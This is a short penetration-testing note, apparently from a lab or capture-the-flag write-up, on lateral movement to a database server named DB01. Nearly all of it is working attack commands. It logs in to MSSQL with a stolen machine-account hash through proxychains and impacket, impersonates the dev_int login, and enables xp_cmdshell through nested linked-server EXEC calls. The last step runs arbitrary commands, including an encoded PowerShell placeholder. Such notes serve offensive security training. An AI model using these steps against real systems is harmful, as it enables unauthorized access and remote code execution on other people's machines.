# Lateral movement to DB01

With admin access on DB01, take the hash of the machine account WEB01$. Connect to MSSQL with `proxychains impacket-mssqlclient -windows-auth -no-pass  'WEB01$'@172.16.X.Y -hashes :<HASH>`.  
Impersonate the user dev_int `EXECUTE AS LOGIN = 'dev_int';`  

Then, perform code execution on yourself using double-exec, after enable xp_cmdshell:  
```sql
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT db01') AT db02
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT db01') AT db02
EXEC ('EXEC (''xp_cmdshell ''''<your cmd here>'''''') AT db01') AT db02
EXEC ('EXEC (''xp_cmdshell ''''powershell -enc XXXXX'''''') AT db01') AT db02
```
